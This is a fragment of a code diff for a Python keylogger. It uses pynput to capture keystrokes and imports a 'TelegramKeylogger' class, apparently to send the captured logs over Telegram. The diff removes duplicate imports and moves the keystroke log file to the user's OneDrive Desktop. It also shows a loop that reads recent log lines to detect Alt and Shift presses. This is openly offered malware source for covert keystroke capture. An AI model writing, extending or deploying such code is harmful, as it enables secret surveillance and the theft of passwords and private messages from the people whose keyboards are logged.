@@ -1,12 +1,9 @@
-from pynput.keyboard import Key, Listener
 import logging
 import getpass
 import threading
 import time
 from pynput import keyboard
 import pyautogui
-import os
-from pynput.keyboard import Key, Listener
 from KeyloggerManager import TelegramKeylogger
 
 try:
@@ -95,7 +92,7 @@ def check_alt_shift_in_log():
     shift_found = False
     while True:
         try:
-            with open('logfile.txt', 'r', encoding='utf-8') as f:
+            with open(f'C:/Users/{username}/OneDrive/Desktop/logfile.txt', 'r', encoding='utf-8') as f:
                 lines = f.readlines()[-2:]
             alt_found = any("Char: '[Key.alt_l]'" in line or "Char: '[Key.alt_r]'" in line for line in lines)
             shift_found = any("Char: '[Key.shift]'" in line or "Char: '[Key.shift_r]'" in line for line in lines)
